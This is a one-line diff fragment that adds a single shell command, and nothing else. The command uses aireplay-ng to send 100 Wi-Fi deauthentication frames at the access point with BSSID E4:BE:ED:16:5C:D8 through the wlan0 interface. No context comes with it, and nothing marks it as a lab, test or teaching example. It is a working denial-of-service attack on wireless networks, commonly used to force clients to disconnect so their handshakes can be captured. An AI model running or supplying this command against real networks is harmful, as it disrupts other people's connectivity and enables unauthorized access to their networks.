@@ -1,0 +1,1 @@
+aireplay-ng --deauth 100 -a E4:BE:ED:16:5C:D8 wlan0
